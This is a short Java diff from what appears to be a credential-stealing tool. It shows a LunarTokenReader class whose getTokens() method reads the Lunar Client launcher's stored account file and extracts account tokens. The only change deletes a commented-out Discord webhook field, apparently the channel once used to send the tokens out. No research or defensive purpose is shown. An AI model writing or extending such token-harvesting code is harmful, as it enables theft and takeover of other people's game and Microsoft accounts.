@@ -12,7 +12,6 @@ import com.google.gson.*;
 
 public class LunarTokenReader extends TokenReader {
     String windowsPath;
-    //private DiscordWebhook webhook;
     public Map<String, String> getTokens() throws IOException {
         JsonObject json = this.readLunarFileJson();
         JsonObject accounts = json.get("accounts").getAsJsonObject();
